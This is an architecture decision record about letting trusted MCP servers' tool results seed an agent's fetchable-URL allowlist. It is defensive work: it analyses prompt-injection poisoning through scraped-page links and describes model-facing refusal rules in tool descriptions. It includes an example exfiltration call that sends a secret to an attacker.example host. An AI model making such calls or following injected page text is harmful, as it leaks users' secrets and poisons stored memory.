---
id: 0067
date: 2026-09-05
status: accepted
tags: [mcp, web, tools, security, prompt-injection, allowlist, no-migration]
supersedes: []
extends: [0024, 0026]
amends: [0011, 0066]
amended_by: [0125, 0150]
---

# MCP tool results may seed the conversation's fetchable-URL allowlist (per-server opt-in)

> **Amended by [ADR 0125](0125-remove-fetch-web-page-and-context-dev.md) (2026-11-14).** The seeded allowlist now feeds `read_web_document` only, because `fetch_web_page` no longer exists.

> **Amends [ADR 0011](0011-web-search-self-hosted-searxng-sidecar.md)** — the fetchable-URL allowlist
> gains a **third** feeder, and the "a string a search engine or the user produced *verbatim*" property
> is narrowed for the servers a user opts in. **Amends [ADR 0066](0066-in-container-document-fetch-for-rag.md)**
> — its threat model changes: our own container will now dial URLs authored on a scraped page. Both
> decisions stand; neither is superseded.

## Context

`AgentGrainState.FetchableUrls` is fed from exactly two places: `WebTools.WebSearchAsync` (every result URL) and
`WebTools.RememberFromUserText` (a real user turn). A URL that arrives any other way is refused by
`fetch_web_page` and `read_web_document`.

The sibling repo's `Scraper.Mcp` exposes `find_links(url, filter)`, which returns link texts with
**absolute hrefs** — precisely the "point me at the page that links the PDF" case that ADR 0066's
`read_web_document` exists to serve. Today the model can *see* that href and cannot *use* it: the user
must copy it out of the reply and paste it back in a second message. The feature is complete apart from
one missing edge in the graph.

## Decision

A **per-server opt-in flag**, `StoredMcpServer.SeedsFetchableUrls` (trailing `[Id(13)]`, default
`false`). When it is on, `BuildAgent` wraps that server's tools in a delegating `UrlHarvestingMcpTool`
which harvests absolute http(s) URLs out of each tool result into a **separate**, separately-bounded
`AgentGrainState.SeededFetchableUrls` (trailing `[Id(13)]`). `FetchableUrlList.IsFetchable` consults both lists, so a
seeded URL is fetchable by `fetch_web_page` and readable by `read_web_document`.

Two caps, both new constants beside `MaxFetchableUrls`:

- **`MaxSeededUrlsPerResult = 20`** — at most this many URLs from one tool result, in document order.
- **`MaxSeededFetchableUrls = 100`** — the seeded list's own bound, oldest dropped first.

Every harvest logs the server id and the URLs it seeded.

## The security position, stated exactly

Four points, in order of how easily each is got wrong.

**1. Exfiltration through MCP is already open, and this MR does not create it.** `BuildAgent` gates MCP
tools by *selection key only* — never by argument — so a model can already call
`find_links("https://attacker.example/?q=<secret>")` today. ADR 0024 records that. This ADR must not be
read as opening an exfiltration channel; overstating the delta hides the real cost.

**2. It adds durable INBOUND poisoning, with a laundering step.** `find_links` returns hrefs *from the
scraped page*, so attacker-authored URLs become **ingestible** by `read_web_document`, which writes
vector chunks and — through ADR 0056 — can be retained into a memory bank with **no delete path**. At the
point of use, a URL that reached the conversation from untrusted page text is indistinguishable from one
the user typed. That is the laundering step, and it is the actual delta.

**3. The sharpest consequence: our own container will now dial attacker-authored URLs.**
`read_web_document` fetches from inside the container that holds the managed identity. Until now the
whole-URL allowlist meant it only ever dialled a string a search engine or the user produced *verbatim*.
After this it dials strings authored on a scraped page. **`PrivateAddressGuard` is not a substitute** —
it "permits every public address by construction, so it is no defence against the channel that actually
matters" (`.agentic/gotchas.md`). ADR 0066 already records that an `excludedPaths` API-key holder can
make our container dial a chosen URL; this adds a second, **model-facing** door to the same property.

**4. "User-invoked" is not a distinguishable state and must not be designed around.** Every MCP tool call
is model-chosen; the user only writes prose. There is no signal separating "the user asked for
`find_links`" from "an injected page talked the model into it". Any design that leans on that
distinction is leaning on nothing.

## Two lists and two caps — and what the split costs

The seeded URLs go in their **own** list, not into `FetchableUrls`:

- `FetchableUrls` is capped at `MaxFetchableUrls` (50), oldest dropped first, inside the 2 MB session
  item (ADR 0004). Harvesting into it means one link-heavy scrape **silently evicts every URL the user
  typed** — a functional defect before it is a security one.
- Split, seeded URLs can only evict each other, and state can say where a URL came from.

**The per-result cap is not belt-and-braces.** An MCP result is capped at
`McpToolLimits.MaxToolResultLength` = 8 KB ≈ **150–250 URLs**. Without a per-result cap, one scrape of a
link-heavy page fills the 100-entry seeded list and evicts the very `find_links` URL the feature exists
to deliver — the same defect the split was introduced to prevent, reproduced one level down.

**The counter-effect, recorded as a cost rather than left out:** isolating seeds makes a poisoned seed
*harder to flush*. In one shared list, ordinary user and search activity evicts it within 50 entries; in
its own list only other seeds can, and there is no revoke path. The split **extends** an
attacker-planted URL's lifetime. It is still the right trade — losing the user's own URLs is a certainty,
while the eviction of a poisoned seed was never a control anyone was relying on — but it is a trade.

**The audit line is part of the decision, not a nicety.** Provenance is only real if something reads it,
so `WebTools.RememberSeededUrlsFromToolResult` logs the seeding server id and the URLs — the
`WebSearchAsync`/`FetchWebPageAsync` idiom, and ADR 0027's rule that allowlist-exempt channels must be
auditable after the fact. Without that line the separate list is dead state cited as a design reason.

## The prohibition lives in the tool descriptions, not in `SKILL.md`

The model is told not to do this in **six** places, and the strongest are the tool descriptions, which
sit in the JSON schema on **every** turn: the `fetch_web_page` and `read_web_document` descriptions in
`BuildAgent`, the two `[Description]` attributes on their `url` parameters, and the two refusal messages.
`src/Agent42.Agents/Skills/websearch/SKILL.md` is the *weakest* surface — it reaches the model through `load_skill` and only
while the `skill:websearch` selection survives (ADR 0021/0048).

All six are updated. Shipping with only `SKILL.md` changed would leave a compliant model reading a hard
prohibition in the schema and declining to use a seeded URL: the feature would look broken while every
test passed.

The wording keeps the rule intact for its real case and carves out **only** this one: lifting a URL out
of **page text** stays forbidden; a URL delivered by a **tool result from a server the user marked as
trusted for links** is permitted. It is deliberately not softened into "use your judgement".

## Why the harvest is in the grain, not the Backend wrapper

`TruncatingMcpTool` already wraps every MCP tool and sees its result — the obvious seam, and the wrong
one. `FetchableUrls` is **per-conversation grain state**, while `UserMcpToolProvider` is a **per-user
singleton** whose wrapped tool instances are shared across every conversation of that user. Harvesting
there would leak one conversation's discovered URLs into another. A wrapper constructed in `BuildAgent`
closes over `this`, so it is conversation-scoped by construction.

## Deliberately NOT guarded on the reminder path

`WebTools.RememberFromUserText` is called only on real user turns, never on the reminder path, because
a scheduled prompt's text is *model*-authored. That rule does not transfer here: it is about harvesting
from **prompt text**, and a tool result is equally untrusted on both paths. A reminder-path guard would
buy nothing while implying the chat path is trusted. Stated explicitly so a reader does not assume it was
overlooked.

Honest residual: a reminder fires with nobody watching, so a poisoned seed can be acted on unattended.
That is already true of MCP tools generally.

## Alternatives considered

- **Fetch only, not `read_web_document`.** Rejected: the motivating case *is* the document
  (`find_links` → a PDF), and the split would leave the feature unable to do the thing it was asked for
  while still paying the whole inbound-poisoning cost.
- **Turn-scoped seeds** (a seeded URL usable only within the turn that produced it). Attractive — it
  removes the durability in point 2 — but the model routinely calls `find_links`, reports, and reads the
  document on the *next* turn after the user picks one. It would break the primary flow to close a
  channel that a re-run of the same MCP call reopens.
- **All servers, no flag.** Rejected: it turns every MCP server a user has ever added — including one
  whose tools return whole pages of markdown — into an allowlist feeder, with no way to say no.
- **Per-TOOL granularity** (ADR 0058's `mcp:{id}:{tool}` machinery already exists, so this was cheap and
  is the alternative that deserved a real argument rather than a bullet). Rejected for now, but the
  argument cuts both ways and is worth recording honestly: the *use case* is a link lister, and the
  *hazard* is a full-page-markdown tool sitting on the same server — exactly the shape per-tool selection
  was built for. What decided it: seeding is a property of **how much the user trusts a server's
  operator**, not of one endpoint's name; per-tool seeding would need the tool names discovered before
  the checkbox can exist (ADR 0058's cold start), so a freshly added server could not be configured at
  all; and the per-result cap plus the separate list already bound the full-page-markdown case to 20
  URLs it cannot use for anything the same tool could not already reach by argument (point 1). If the
  hazard shows up in practice, the machinery is there and this is a narrowing change, not a redesign.
- **A confirmation gate before a seeded URL is used.** The honest mitigation, and a bigger feature: the
  chat path is a one-way NDJSON stream, so a mid-turn prompt has no mechanism (the wall ADR 0012 hit).
  Recorded as the follow-up.

## Consequences

- A URL that arrives in a seeding server's tool result is fetchable and ingestible for the rest of the
  conversation, without the user pasting it back.
- **Every existing server ships with seeding off** — the flag is trailing and defaults to `false`, so
  there is no migration and no behaviour change for anyone who does not turn it on.
- The flag is a **setting**, not discovered metadata: it rides the request through `ToStored` and
  deliberately gains **no** `Keep` clause in `UserMcpConfigGrain.SaveAsync` — with one, a user could
  never turn it off.
- ADR 0066's container-dials-a-chosen-URL property is now reachable from the model, not only from an
  `excludedPaths` API-key holder.
- ADR 0011's "whole URLs, deliberately" reasoning is **narrowed, not deleted**: it still holds for the
  two original feeders and for every non-seeding server.
- No new secret, container, Cosmos container, Bicep change or `excludedPaths` entry. No package added.
- **No revoke path for a seeded URL**, and (as ever) no delete path for a retained Hindsight memory
  (ADR 0056). Both are stated as residuals rather than dressed up as bounded.

## Verification

The offline leg **was** run — DevHost driven over HTTP and headless Chrome over CDP (the ADR 0064/0065
precedent), 2026-09-05. Measured values, not claims:

**The feature end to end, and the A/B that makes it non-vacuous.** The same prompt was sent twice against
the same demo server and the same tool result, changing only the server's `SeedsFetchableUrls`:

| `SeedsFetchableUrls` | `demo_find_links` result | `read_web_document` outcome |
|---|---|---|
| `true` | `{"links":[{"href":"https://demo.invalid/whitepaper.pdf"}]}` | **ingested** — 1 chunk, excerpt returned, `FileName: "whitepaper.pdf (web: demo.invalid)"` |
| `false` | *identical* | **refused** — "A document can only be read if that exact URL came back from a web_search…" |

Nobody typed that URL and no search returned it, so the accepted case is reached only through the harvest.
The refused case also confirms the reworded refusal message renders — the carve-out did not weaken into
acceptance.

**The UI, at 1280×900 in headless Chrome.** Preferences → MCP servers (rail item 4; tabs measured as
General / Tools / Model providers / MCP servers / Configuration / Skills — index 3 unchanged, ADR 0065):

| Observation | Value |
|---|---|
| Checkbox on the **seeding** server's edit dialog | `checked: true`, visible (15×15 at y=452) |
| Checkbox on the **never-connected** (non-seeding) server | `checked: false` |
| Untick → Save → `GET /api/mcp-servers` | `offline: seeds=false` |
| Re-tick → Save → `GET /api/mcp-servers` | `offline: seeds=true` |
| Label rendered | `// let links from this server be opened and read` |

The untick half is the one worth having measured: it is the end-to-end proof that the flag gained no
`Keep` clause — that the opt-in is not one-way.

**Three DevHost changes were needed to make any of this possible**, recorded rather than buried:
`SingleUserMcpToolProvider` never reads `UserMcpConfig`, so the offline group carries the seeding flag in
code; its demo tools returned the literal `"ok"`, so a `demo_find_links` tool returning a JSON link list
was added; and `CannedChatClient` gained the two-call chain (`"find and read"`) — it previously answered in
text as soon as any tool had run, so no offline prompt could reach a second call at all.

The **deselection** leg was measured too, because it is the first thing anyone tries by hand: with the MCP
tools removed from a conversation's selection (`PUT /api/conversations/{id}/tools` → `["web_search",
"read_web_document"]`), the same prompt produces a plain text reply and **no tool call at all**. That
required giving the canned client the `options.Tools` guard its test twin already had — without it a model
that was never offered the tool calls it anyway, which is not a thing a real model can do.

**Honest residuals.** This proves the WIRING, not an MCP handshake (ADR 0064's standing residual): the
offline tools are local delegates, not a remote server. Nothing here exercises the Cosmos vector path
either — `InMemoryWebDocumentFetcher` and the in-memory index stand in, exactly as they do for ADR 0066.
The truncation-boundary rule is covered only by the test suite, where it was **mutation-checked**:
disabling `IsAtTruncationBoundary` fails `TruncatedUrl_IsNotSeeded`.
